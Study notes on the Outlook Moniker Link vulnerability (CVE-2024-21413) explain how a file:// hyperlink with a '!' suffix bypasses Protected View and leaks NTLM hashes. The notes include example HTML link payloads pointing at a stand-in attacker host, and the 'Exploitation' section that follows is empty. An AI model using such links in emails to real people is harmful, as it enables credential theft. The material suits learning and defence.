ðŸ”´ Introduction
- Moniker Link (CVE-2024-21413) was a vulnerability of Microsoft Outlook Application.
- It was found by Haifei Li of Check Point Research (Company).
- Microsoft announced it as a CVE (Comman Vulnerabilities and Exposures) on 13th Feb 2024.
- The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link.
- When we provide a hyperlink other than http/https to outlook and tries to open it, the outlook gives us a security risk warning.
- But with Moniker Link, Its a hyperlink with '!' symbol appended with, bypass the security mechanism.
- An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim.
- This can result in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

ðŸ”´ ----
- Outlook can render emails as HTML and it recognize and make hyperlinks clickable such as HTTP and HTTPS.
- It can also open URLs specifying applications, like skype, outlook, Teams, etc.
- These links are known as Moniker Links, these type of Links are developed by Microsoft.
- They developed monikers links to make it easey and hassle-free to open apps, files or items inside apps.
- Normally, Outlook will prompt a security warning when external applications are triggered.
  
  <img width="361" height="229" alt="image" src="https://github.com/user-attachments/assets/b4557298-3ddd-4f4f-830b-cfebc608fea9" />

- "Protected View" of Outlook gives this pop-up.
- This mode opens emails containing attachments, hyperlinks and similar content in read-only mode, blocking things such as macros (especially from outside an organisation).
-  By using the **file://** Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (<a href="file://ATTACHER_IP/test">Click me</a>).
-  SMB Protocol -  Server Message Block (SMB) is a communication protocol. It provides shared access to files and printers across nodes on a network of system.
-  When one try to click on file:// moniker link the SMB protocol is triggered and the it will use local credentials for authentication.
-  But in this case the Outlook's Protected View blocks this attempt.
-  If we modify our hyperlink (<a href="file://ATTACHER_IP/test">Click me</a>) to include the **!** special character and some text in our Moniker Link which result in bypassing Outlook's Protected View, Like this example- <a href="file://ATTACHER_IP/test!exploit">Click me</a>.
-  **If one provide a Moniker Link for the attack, and someone click on it the computer tries to connect to remote system and it leads to the victim's Windows netNTLMv2 hash being sent to the attacker.
-  Remote Code Execution (RCE) is a type of attack can be possible by attacker because Moniker Link uses the Component Object Model (COM) on Windows.**

ðŸ”´ Exploitation
-  
